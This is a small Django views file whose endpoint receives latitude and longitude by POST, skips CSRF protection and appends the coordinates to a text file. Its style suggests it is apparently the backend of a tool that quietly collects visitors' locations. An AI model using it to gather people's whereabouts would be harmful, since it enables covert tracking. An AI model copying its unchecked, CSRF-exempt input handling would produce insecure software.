from django.shortcuts import render
from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt

# Create your views here.

def home(request):
    return render(request, "index_home.html")


@csrf_exempt
def posts(request):
    if request.method == "POST":
        if "lat" in request.POST and "lng" in request.POST:
            latitude = request.POST['lat']
            longitude = request.POST['lng']
            data = "Latitude: {0}  Longitude: {1} \n--------------------------------------".format(latitude, longitude)
            print("\n[+]" + data)
            print("Location is saved on /djserver/djsite/data.txt\n")
            opnr = open("data.txt", "a+")
            opnr.write(data + "\n")
            opnr.close()

            return HttpResponse("Location Stored On server")
    
    return HttpResponse("Error")
